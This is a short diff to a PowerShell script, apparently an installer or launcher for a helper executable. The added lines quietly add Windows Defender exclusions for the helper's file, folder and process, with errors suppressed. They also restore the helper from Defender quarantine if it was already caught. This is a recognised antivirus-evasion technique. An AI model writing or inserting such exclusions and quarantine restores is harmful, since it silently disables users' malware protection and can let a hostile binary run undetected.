@@ -9,6 +9,26 @@ try {
 
   $currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 
+  # Add Windows Defender exclusion for the helper (best-effort; requires admin, may be blocked by Tamper Protection)
+  try {
+    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+      $exeDir = Split-Path -Parent $exePath
+      Add-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue
+      Add-MpPreference -ExclusionPath $exeDir  -ErrorAction SilentlyContinue
+      Add-MpPreference -ExclusionProcess ([System.IO.Path]::GetFileName($exePath)) -ErrorAction SilentlyContinue
+    }
+  } catch {
+    Write-Host "Warning: Failed to add Defender exclusion: $($_.Exception.Message)"
+  }
+
+  # If the helper was already quarantined, restore it (best-effort)
+  try {
+    $mpCmd = Join-Path $env:ProgramFiles "Windows Defender\MpCmdRun.exe"
+    if (Test-Path -LiteralPath $mpCmd) {
+      & $mpCmd -Restore -FilePath $exePath 2>$null
+    }
+  } catch {}
+
   if (Test-Path -LiteralPath $exePath) {
     $processName = [System.IO.Path]::GetFileNameWithoutExtension($exePath)
     $runningProcesses = Get-Process -Name $processName -ErrorAction SilentlyContinue
